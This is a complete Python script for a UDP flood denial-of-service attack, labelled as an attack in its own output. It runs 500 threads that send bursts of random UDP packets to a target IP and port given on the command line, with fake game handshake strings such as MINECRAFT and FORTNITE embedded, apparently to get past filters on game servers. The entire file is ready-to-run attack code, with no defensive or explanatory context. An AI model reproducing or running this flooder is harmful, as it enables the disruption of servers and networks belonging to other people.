import socket
import random
import sys
import time
import threading

def udp_with_handshake(target_ip, target_port, duration):
    """UDP packets with game handshakes embedded"""
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Game handshake patterns
    handshakes = [
        b'GAME', b'PLAY', b'JOIN', b'AUTH', b'INIT',
        b'SYN', b'ACK', b'PING', b'PONG', b'HELO',
        b'\x00\x01', b'\xFF\xFF', b'\xFE\xFD',
        b'\x16\x03', b'\x13\x00',
    ]
    
    # Game-specific patterns
    game_patterns = [
        b'MINECRAFT', b'CSGO', b'FORTNITE', b'ROBLOX',
        b'VALORANT', b'APEX', b'COD', b'GTA',
        b'STEAM', b'EPIC', b'ORIGIN', b'UPLAY',
    ]
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            # SEND IN BURSTS FOR MAX POWER
            for _ in range(random.randint(50, 200)):
                
                # Create base UDP packet
                udp_size = random.randint(512, 1450)
                udp_data = random._urandom(udp_size)
                
                # Embed handshake inside UDP data
                if random.random() < 0.8:  # 80% chance to embed handshake
                    # Choose handshake type
                    if random.random() < 0.7:
                        handshake = random.choice(handshakes)
                    else:
                        handshake = random.choice(game_patterns)
                    
                    # Add sequence/data to handshake
                    handshake += b':' + str(random.randint(1, 9999)).encode()
                    
                    # Embed at random position in UDP data
                    if len(handshake) < len(udp_data):
                        pos = random.randint(0, len(udp_data) - len(handshake))
                        udp_data = udp_data[:pos] + handshake + udp_data[pos + len(handshake):]
                
                # Send combined packet
                sock.sendto(udp_data, (target_ip, target_port))
            
            # Minimal delay
            time.sleep(0.0001)
            
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock.close()

def start_combined_attack(target_ip, target_port, duration):
    """Start combined UDP + handshake attack"""
    
    print(f"[⚡] UDP + HANDSHAKE COMBO ATTACK")
    print(f"[🎯] Target: {target_ip}:{target_port}")
    print(f"[⏱️] Time: {duration}s")
    print("[🔥] Combining UDP flood with game handshakes...")
    
    # Multiple threads
    threads = []
    num_threads = 500
    
    for i in range(num_threads):
        t = threading.Thread(target=udp_with_handshake, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Timer
    time.sleep(duration)
    print(f"[✅] Attack completed!")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    start_combined_attack(target_ip, target_port, duration)
